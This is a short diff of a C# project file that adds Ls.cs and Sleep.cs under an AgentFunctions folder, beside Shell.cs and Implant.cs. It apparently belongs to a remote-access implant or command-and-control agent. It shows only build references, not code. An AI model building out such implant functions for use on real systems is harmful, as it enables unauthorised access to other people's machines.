@@ -51,7 +51,9 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="AgentFunctions\Ls.cs" />
     <Compile Include="AgentFunctions\Shell.cs" />
+    <Compile Include="AgentFunctions\Sleep.cs" />
     <Compile Include="Config.cs" />
     <Compile Include="Implant.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
